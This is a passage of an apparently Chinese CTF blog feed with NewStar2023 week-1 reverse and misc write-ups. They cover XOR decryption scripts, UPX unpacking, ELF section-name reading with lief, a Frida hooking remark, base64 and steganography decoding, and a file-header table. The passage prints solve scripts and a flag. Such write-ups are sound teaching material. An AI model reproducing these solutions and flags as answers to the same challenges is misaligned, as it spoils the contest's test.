data-num=\"28\"></td><td><pre>click_thread<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>还有一个方法就是用 hook access$000 函数让该函数直接返回 10000，但是要在模拟器上面安装和自己电脑 fiida 版本对应的 frida-server。</p>\n<h3 id=\"androxor\"><a class=\"anchor\" href=\"#androxor\">#</a> AndroXor</h3>\n<p>反编译找到 MainActivty，阅读代码后可以知道是异或操作</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>public class androidxor <span class=\"token punctuation\">&#123;</span>    </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">static</span> String str2 <span class=\"token operator\">=</span> <span class=\"token string\">\"happyx3\"</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">static</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cArr <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\r'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'K'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'I'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'7'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'I'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\f'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'>'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'('</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'@'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\''</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'K'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'Y'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'A'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\r'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>public <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>        </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    StringBuilder sb <span class=\"token operator\">=</span> new <span class=\"token function\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">25</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>        <span class=\"token punctuation\">&#123;</span>            </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">char</span> charAt <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span> cArr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> str2<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">%</span> str2<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        sb<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>charAt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span>        </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>sb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>编写解密脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>str2 <span class=\"token operator\">=</span> <span class=\"token string\">\"happyx3\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cArr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'K'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'I'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'I'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'('</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'@'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'K'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Y'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cArr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 初始化一个空字符串来存储计算结果</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 使用循环来逐字符还原 str</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> string<span class=\"token punctuation\">.</span>printable<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        charAt <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> charAt <span class=\"token operator\">==</span> cArr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token builtin\">str</span> <span class=\"token operator\">+=</span> j</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"endian\"><a class=\"anchor\" href=\"#endian\">#</a> endian</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v5 <span class=\"token operator\">!=</span> <span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x12345678</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>把 array 的数据提取出来 异或 0x12345678 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 定义整数数组</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>array <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x75553A1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B583A03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D58220C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B50383D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x736B3819</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 初始化 v5 的值</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>v5_value <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 模拟循环比较的逻辑</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    result <span class=\"token operator\">=</span> array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x12345678</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    v5_value <span class=\"token operator\">+=</span> result<span class=\"token punctuation\">.</span>to_bytes<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>byteorder<span class=\"token operator\">=</span><span class=\"token string\">'little'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>v5_value<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"壳\"><a class=\"anchor\" href=\"#壳\">#</a> 壳</h3>\n<p>壳是我们逆向工程中一大方向，而我们 CTF 一般遇到的都是压缩壳（当然少数比赛还有加密壳或自写壳等），掌握好压缩壳的基本识别与动态脱壳即可掌握好该考点</p>\n<p>我们下载 DIE 或 exeinfo 用来查壳，可以发现是 UPX4.02，那么我们只需要用高版本 UPX 工具，即可脱壳（上述工具推荐在 52 破解或是 github 上搜索自写）</p>\n<p>脱壳后拖进 IDA64，可以发现对我们的 input 唯一的操作就是进行 +1，那我们提取密文直接 -1 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x7E</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> end <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"shiftf7\"><a class=\"anchor\" href=\"#shiftf7\">#</a> Shift+f7</h3>\n<p>本题有两种解法，首先是可以通过题目名称来解，将文件拖入 IDA，然后按下 shift+f7 即可看到 flag 被拆分放在各个段中，由于 IDA 的问题可能无法显示大括号，不过细心观察应该是很容易能看出来 flag 的。</p>\n<p><img data-src=\"../../../images/NewStar/11.png\" alt=\"11\" /></p>\n<p>第二种解法可以使用 python 的 lief 库来读取，可以看到 flag 是从低到高的顺序保存的，通过 lief 库可以读出相应的名字。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> lief</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\\# 读取二进制文件</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>binary <span class=\"token operator\">=</span> lief<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">(</span><span class=\"token string\">\"shift_f7\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\\# 过滤掉低于<span class=\"token number\">0x1000</span>地址的段和<span class=\"token punctuation\">.</span>dynamic段</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>filtered_sections <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>section <span class=\"token keyword\">for</span> section <span class=\"token keyword\">in</span> binary<span class=\"token punctuation\">.</span>sections <span class=\"token keyword\">if</span> section<span class=\"token punctuation\">.</span>virtual_address <span class=\"token operator\">>=</span> <span class=\"token number\">0x1000</span> <span class=\"token keyword\">and</span> section<span class=\"token punctuation\">.</span>name <span class=\"token operator\">!=</span> <span class=\"token string\">'.dynamic'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\\# 按地址从低到高排序</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sorted_sections <span class=\"token operator\">=</span> <span class=\"token builtin\">sorted</span><span class=\"token punctuation\">(</span>filtered_sections<span class=\"token punctuation\">,</span> key<span class=\"token operator\">=</span><span class=\"token keyword\">lambda</span> section<span class=\"token punctuation\">:</span> section<span class=\"token punctuation\">.</span>virtual_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\\# 输出排序后的段名和地址</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">for</span> section <span class=\"token keyword\">in</span> sorted_sections<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>section<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\\#flag<span class=\"token punctuation\">&#123;</span>You_ar3_g0od_at_f1nding_ELF_segments_name<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "逆天的reverse",
                "NewStar2023",
                "开逆！"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/misc/NewStar2023week1/",
            "url": "https://p1kap1.github.io/CTF/misc/NewStar2023week1/",
            "title": "NewStar2023week1-misc",
            "date_published": "2023-09-30T16:00:00.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"cyberchefs-secret\"><a class=\"anchor\" href=\"#cyberchefs-secret\">#</a> CyberChef's Secret</h3>\n<blockquote>\n<p>Sign in！！！</p>\n</blockquote>\n<p>下载压缩文件，解压后得到：</p>\n<blockquote>\n<p>来签到吧！下面这个就是 flag，不过它看起来好像怪怪的:-)<br />\nM5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=</p>\n</blockquote>\n<p>这里可以直接使用 ciphey 来进行解密。</p>\n<p>具体安装方法可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzY4MDEyMzczL2FydGljbGUvZGV0YWlscy8xMjU1MTY1OTI=\">CTF-Crypto 必备自动解密神器 python-Ciphey（详细安装介绍）</span></p>\n<p>或者使用 cyberchef 中的 magic 来解决：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pY3liZXJjaGVmLmNvbS8=\">CyberChef 在线网站</span></p>\n<p><img data-src=\"../../../images/NewStar/2.png\" alt=\"2\" /></p>\n<h3 id=\"机密图片\"><a class=\"anchor\" href=\"#机密图片\">#</a> 机密图片</h3>\n<blockquote>\n<p>小宝最近学会了隐写术，并且在图片中藏了一些秘密，你能发现他的秘密吗？</p>\n</blockquote>\n<p>lsb 隐写，使用 StegSolve 工具，点击 &quot;Analyse&quot; -&gt; &quot;Data Extract&quot;，提取最低位信息即可。</p>\n<h3 id=\"流量鲨鱼\"><a class=\"anchor\" href=\"#流量鲨鱼\">#</a> 流量！鲨鱼！</h3>\n<p>题目中有大量的目录扫描爆破流量，使用 WireShark 过滤器来过滤掉干扰的流量：</p>\n<p>http &amp;&amp; http.response.code == 200</p>\n<p>提取出 HTTP 响应数据：</p>\n<p>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</p>\n<p>Base64 解码两次得到 Flag</p>\n<h3 id=\"压缩包们\"><a class=\"anchor\" href=\"#压缩包们\">#</a> 压缩包们</h3>\n<blockquote>\n<p>常见的压缩包又能玩出什么花样呢？</p>\n</blockquote>\n<p>用 16 进制编辑器打开（01Editor or winhex)</p>\n<p>首先要修复文件头，这里列举一些常见的文件头：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>JPEG <span class=\"token punctuation\">(</span>jpg<span class=\"token punctuation\">)</span>，文件头：FF D8 FF</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>PNG <span class=\"token punctuation\">(</span>png<span class=\"token punctuation\">)</span>，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0a</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>GIF <span class=\"token punctuation\">(</span>gif<span class=\"token punctuation\">)</span>，文件头：47 49 46 38</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Windows Bitmap <span class=\"token punctuation\">(</span>bmp<span class=\"token punctuation\">)</span>，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>python反编译文件pyc的头：03 F3 0D 0A  （实验吧，py的交易会用到）</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>pyd的文件头：4D 5A 90 00</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ZIP Archive <span class=\"token punctuation\">(</span>zip<span class=\"token punctuation\">)</span>，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>rar文件<span class=\"token punctuation\">:</span> 52 61 72 21</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>7z文件头：37 7A BC AF 27 1C（实验吧，有趣的文件用到了）</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>MS Word/Excel <span class=\"token punctuation\">(</span>xls.or.doc<span class=\"token punctuation\">)</span>，文件头：D0CF11E0</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>CAD <span class=\"token punctuation\">(</span>dwg<span class=\"token punctuation\">)</span>，文件头：41433130</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Adobe Photoshop <span class=\"token punctuation\">(</span>psd<span class=\"token punctuation\">)</span>，文件头：38425053</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Rich Text Format <span class=\"token punctuation\">(</span>rtf<span class=\"token punctuation\">)</span>，文件头：7B5C727466</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>XML <span class=\"token punctuation\">(</span>xml<span class=\"token punctuation\">)</span>，文件头：3C3F786D6C</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>HTML <span class=\"token punctuation\">(</span>html<span class=\"token punctuation\">)</span>，文件头：68746D6C3E</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Email [thorough only] <span class=\"token punctuation\">(</span>eml<span class=\"token punctuation\">)</span>，文件头：44656C69766572792D646174653A</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Outlook Express <span class=\"token punctuation\">(</span>dbx<span class=\"token punctuation\">)</span>，文件头：CFAD12FEC5FD746F</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Outlook <span class=\"token punctuation\">(</span>pst<span class=\"token punctuation\">)</span>，文件头：2142444E</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>MS Access <span class=\"token punctuation\">(</span>mdb<span class=\"token 